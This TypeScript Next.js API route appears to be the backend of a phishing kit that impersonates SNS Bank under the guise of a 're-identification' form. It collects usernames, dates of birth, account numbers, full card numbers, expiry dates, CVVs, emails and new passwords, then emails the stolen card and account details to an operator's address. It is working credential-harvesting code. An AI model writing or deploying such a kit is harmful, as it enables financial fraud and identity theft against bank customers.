import { type NextRequest, NextResponse } from "next/server"
import { z } from "zod"

// Complete form schema for final submission
const finalSubmissionSchema = z.object({
  // Step 1
  username: z.string().min(1, "Gebruikersnaam is verplicht"),
  fullName: z.string().min(1, "Volledige naam is verplicht"),
  accountTypes: z.array(z.enum(["private", "business", "creditcard"])).min(1, "Selecteer minimaal één rekeningtype"),

  // Step 2
  idType: z.enum(["passport", "id-card", "drivers-license"]),
  fullNameConfirm: z.string().min(1, "Bevestig je volledige naam"),
  dateOfBirth: z.string().min(1, "Geboortedatum is verplicht"),
  phoneNumber: z.string().min(1, "Telefoonnummer is verplicht"),
  accountNumber: z.string().min(1, "Rekeningnummer is verplicht"),
  cardNumber: z.string().min(1, "Kaartnummer is verplicht"),
  cardName: z.string().min(1, "Naam op kaart is verplicht"),
  expiryDate: z.string().min(1, "Vervaldatum is verplicht"),
  cvv: z.string().min(3, "CVV moet minimaal 3 cijfers zijn"),

  // Step 3
  missingData: z.array(z.enum(["middlenames", "address", "birthplace", "nationality"])),
  fullEmail: z.string().email("Ongeldig e-mailadres"),
  newPassword: z.string().min(6, "Wachtwoord moet minimaal 6 tekens zijn"),

  // Step 4
  consent: z.boolean().refine((val) => val === true, "Toestemming is verplicht"),
})

async function sendFinalSubmissionEmail(formData: any): Promise<boolean> {
  try {
    if (!process.env.ADMIN_EMAIL || !process.env.FROM_EMAIL || !process.env.RESEND_API_KEY) {
      console.log("Final submission would be sent to:", process.env.ADMIN_EMAIL || "undefined")
      return true // Simulate success for development
    }

    const { Resend } = await import("resend")
    const resend = new Resend(process.env.RESEND_API_KEY)

    const subject = "SNS Bank Re-identificatie - Volledige Aanvraag"
    const html = generateFinalEmailHTML(formData)
    const text = generateFinalEmailText(formData)

    await resend.emails.send({
      to: process.env.ADMIN_EMAIL,
      from: process.env.FROM_EMAIL,
      subject,
      html,
      text,
    })

    return true
  } catch (error) {
    console.error("Final submission email error:", error)
    return false
  }
}

function generateFinalEmailHTML(formData: any): string {
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <div style="background-color: #FF6600; padding: 20px; text-align: center;">
        <h1 style="color: white; margin: 0;">SNS Bank</h1>
        <h2 style="color: white; margin: 10px 0 0 0;">Volledige Re-identificatie Aanvraag</h2>
      </div>
      
      <div style="padding: 20px; background-color: #f9f9f9;">
        <h3 style="color: #003366;">Persoonlijke Gegevens</h3>
        <p><strong>Gebruikersnaam:</strong> ${formData.username}</p>
        <p><strong>Volledige naam:</strong> ${formData.fullName}</p>
        <p><strong>Rekeningtypes:</strong> ${formData.accountTypes?.join(", ")}</p>
        
        <h3 style="color: #003366;">ID Verificatie</h3>
        <p><strong>ID Type:</strong> ${formData.idType}</p>
        <p><strong>Geboortedatum:</strong> ${formData.dateOfBirth}</p>
        <p><strong>Telefoonnummer:</strong> ${formData.phoneNumber}</p>
        <p><strong>Rekeningnummer:</strong> ${formData.accountNumber}</p>
        <p><strong>Kaartnummer:</strong> ${formData.cardNumber}</p>
        <p><strong>Naam op kaart:</strong> ${formData.cardName}</p>
        <p><strong>Vervaldatum:</strong> ${formData.expiryDate}</p>
        
        <h3 style="color: #003366;">Aanvullende Gegevens</h3>
        <p><strong>Ontbrekende gegevens:</strong> ${formData.missingData?.join(", ")}</p>
        <p><strong>E-mailadres:</strong> ${formData.fullEmail}</p>
        
        <div style="margin-top: 30px; padding: 15px; background-color: #e8f4fd; border-left: 4px solid #FF6600;">
          <p><strong>Status:</strong> Toestemming verleend voor verwerking volgens Wwft wetgeving</p>
          <p><strong>Tijdstip:</strong> ${new Date().toLocaleString("nl-NL")}</p>
        </div>
      </div>
    </div>
  `
}

function generateFinalEmailText(formData: any): string {
  return `
SNS Bank Re-identificatie - Volledige Aanvraag

Persoonlijke Gegevens:
- Gebruikersnaam: ${formData.username}
- Volledige naam: ${formData.fullName}
- Rekeningtypes: ${formData.accountTypes?.join(", ")}

ID Verificatie:
- ID Type: ${formData.idType}
- Geboortedatum: ${formData.dateOfBirth}
- Telefoonnummer: ${formData.phoneNumber}
- Rekeningnummer: ${formData.accountNumber}
- Kaartnummer: ${formData.cardNumber}
- Naam op kaart: ${formData.cardName}
- Vervaldatum: ${formData.expiryDate}

Aanvullende Gegevens:
- Ontbrekende gegevens: ${formData.missingData?.join(", ")}
- E-mailadres: ${formData.fullEmail}

Status: Toestemming verleend voor verwerking volgens Wwft wetgeving
Tijdstip: ${new Date().toLocaleString("nl-NL")}
  `
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const validatedData = finalSubmissionSchema.parse(body)

    // Send final submission email to admin
    const emailSent = await sendFinalSubmissionEmail(validatedData)

    return NextResponse.json({
      success: true,
      submissionId: Math.random().toString(36).substr(2, 9),
      emailSent,
    })
  } catch (error) {
    console.error("Final submission error:", error)

    if (error instanceof z.ZodError) {
      return NextResponse.json(
        {
          message: "Validatiefout in formuliergegevens",
          errors: error.errors,
        },
        { status: 400 },
      )
    }

    return NextResponse.json(
      {
        message: "Er is een fout opgetreden bij het verzenden van je gegevens",
      },
      { status: 500 },
    )
  }
}
